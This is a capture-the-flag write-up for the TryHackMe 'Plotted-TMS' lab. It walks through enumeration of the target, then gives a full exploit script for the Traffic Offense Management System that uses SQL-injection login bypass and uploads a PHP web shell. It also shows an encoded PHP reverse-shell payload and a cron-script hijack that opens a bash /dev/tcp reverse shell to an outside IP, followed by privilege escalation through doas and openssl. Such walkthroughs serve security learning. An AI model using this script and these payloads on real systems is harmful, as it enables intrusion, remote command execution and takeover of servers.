---
title: TryHackMe Plotted-tms -- Writeup
date: 2022-03-04
categories: [TryHackMe, Easy]
tags: [mis-config, exploit-db, linux]     # TAG names should always be lowercase
---

# Enumeration

`export ip=10.10.188.83`

```bash
nmap -sCV $ip

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-18 03:25 BST
Nmap scan report for ip-10-10-188-83.eu-west-1.compute.internal (10.10.188.83)
Host is up (0.0011s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:9F:A8:88:DC:83 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Alright we got 3 ports open. ssh and two http servers, Lets enumerate port 80, 445

## Port 80

```bash
gobuster dir -u 10.10.188.83 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.188.83
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/05/18 03:30:55 Starting gobuster
===============================================================
/admin (Status: 301)
/shadow (Status: 200)
/passwd (Status: 200)
/server-status (Status: 403)
===============================================================
2022/05/18 03:31:25 Finished
===============================================================
```

Oh nice port 80 looks interesting.. Lets the shadow file

```bash
# We got this
bm90IHRoaXMgZWFzeSA6RA==
echo bm90IHRoaXMgZWFzeSA6RA== | base64 -d 
not this easy :D
```

What a waste of time.. passwd and /admin too give something to this. I almost got rick rolled :d

Now lets move on to port 445

## Port 445

```bash
gobuster dir -u http://10.10.188.83:445 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
======================root@ip-10-10-211-242:~# obuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/05/18 03:32:17 Starting gobuster
===============================================================
/management (Status: 301)
/server-status (Status: 403)
===============================================================
2022/05/18 03:32:45 Finished
===============================================================
```

Alright this looks interesting, now we got something looks cms, what i first do is google the name and see if there's known exploit associate to this software

A very simple google search lead me to exploit-db where i found this exploit.
`https://www.exploit-db.com/exploits/50244`
Now lets download and see if it works

## /management content

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
  	<title>Traffic Offense Management System</title>
    <link rel="icon" href="/management/dist/img/no-image-available.png" />
    <!-- Google Font: Source Sans Pro -->
    <!-- <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&amp;display=fallback"> -->
    <!-- Font Awesome -->
    <link rel="stylesheet" href="/management/plugins/fontawesome-free/css/all.min.css">
    <!-- Ionicons -->
    <!-- <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"> -->
    <!-- Tempusdominus Bootstrap 4 -->
    <link rel="stylesheet" href="/management/plugins/tempusdominus-bootstrap-4/css/tempusdominus-bootstrap-4.min.css">
      <!-- DataTables -->
  <link rel="stylesheet" href="/management/plugins/datatables-bs4/css/dataTables.bootstrap4.min.css">
  <link rel="stylesheet" href="/management/plugins/datatables-responsive/css/responsive.bootstrap4.min.css">
  <link rel="stylesheet" href="/management/plugins/datatables-buttons/css/buttons.bootstrap4.min.css">
   <!-- Select2 -->
  <link rel="stylesheet" href="/management/plugins/select2/css/select2.min.css">
```

# Exploit

```python
#!/usr/bin/env python2
import requests
import time
from bs4 import BeautifulSoup

print ("\nExample: http://example.com\n")

url = raw_input("Url: ")
payload_name = "evil.php"
payload_file = "<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>"

if url.startswith(('http://', 'https://')):
    print "Check Url ...\n"
else:
    print "\n[?] Check Adress\n"
    url = "http://" + url

try:
    response = requests.get(url)
except requests.ConnectionError as exception:
    print("[-] Address not reachable")
    sys.exit(1)

session = requests.session()

request_url = url + "/classes/Login.php?f=login"
post_data = {"username": "'' OR 1=1-- '", "password": "'' OR 1=1-- '"}
bypass_user = session.post(request_url, data=post_data)


if bypass_user.text == '{"status":"success"}':
    print ("[+] Bypass Login\n")
    cookies = session.cookies.get_dict()
    req = session.get(url + "/admin/?page=user")
    parser = BeautifulSoup(req.text, 'html.parser')
    userid = parser.find('input', {'name':'id'}).get("value")
    firstname = parser.find('input', {'id':'firstname'}).get("value")
    lastname = parser.find('input', {'id':'lastname'}).get("value")
    username = parser.find('input', {'id':'username'}).get("value")

    request_url = url + "/classes/Users.php?f=save"
    headers = {"sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryxGKa5dhQCRwOodsq", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    data = "------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n"+ userid +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"firstname\"\r\n\r\n"+ firstname +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"lastname\"\r\n\r\n"+ lastname +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n"+ username +"\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq\r\nContent-Disposition: form-data; name=\"img\"; filename=\""+ payload_name +"\"\r\nContent-Type: application/x-php\r\n\r\n" + payload_file +"\n\r\n------WebKitFormBoundaryxGKa5dhQCRwOodsq--\r\n"
    upload = session.post(request_url, headers=headers, cookies=cookies, data=data)            
    time.sleep(2)

    if upload.text == "1":
        print ("[+] Upload Shell\n")
        time.sleep(2)
        req = session.get(url + "/admin/?page=user")
        parser = BeautifulSoup(req.text, 'html.parser')
        find_shell = parser.find('img', {'id':'cimg'})
        print ("[+] Exploit Done!\n")

        while True:
            cmd = raw_input("$ ")
            headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'}
            request = requests.post(find_shell.get("src") + "?cmd=" + cmd, data={'key':'value'}, headers=headers)
            print request.text.replace("<pre>" ,"").replace("</pre>", "")
            time.sleep(1)

    elif upload.text == "2":
        print ("[-] Try the manual method")
        request_url = url + "/classes/Login.php?f=logout"
        cookies = session.cookies.get_dict()
        headers = {"sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        session.get(request_url, headers=headers, cookies=cookies)
    else:
        print("[!]An unknown error")

else:
    print ("[-] Failed to bypass login panel")
```

## Payload

We use this payload for reverse shell

`php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.211.242%22%2C4444%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`

# User Flag

Now we got foothold, Lets find the flagss. Trying to view the user flag as www-data i got a permission denied. So now lets do some manual enumeration

``` bash
www-data@plotted:/tmp$ cat /etc/crontab
* * 	* * *	plot_admin /var/www/scripts/backup.sh
```

Apparently theres a cronjob running as plot_admin executing /var/www/scripts/backup.sh

```bash
ls -la /var/www/scripts
drwxr-xr-x 2 www-data   www-data   4096 Oct 28  2021 .
drwxr-xr-x 4 root       root       4096 Oct 28  2021 ..
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
```

So here's a thing, Looking at the file is own by root, means we cant modify the file. But the directory is own by www-data. means i create/delete files. So what i end up doing here is, deleting the file and recreating another with thesame name, then mark it executable.

```bash
rm backup.sh
echo '#!/bin/bash' > backup.sh
ehco '/bin/bash -i >& /dev/tcp/10.10.161.239/4445 0>&1' >> backup.sh
chmod +x backup.sh
```

Now we just need to wait for a bit to get our shell.

# Root Flag

Running linpeas we discover that plot_admin is allowd to run doas wiht no pass. So you know whats next (gtfobins)

``` bash
doas openssl enc -in /root/root.txt
```
Now we done congratsss.

Thanks for reading, I hope this helps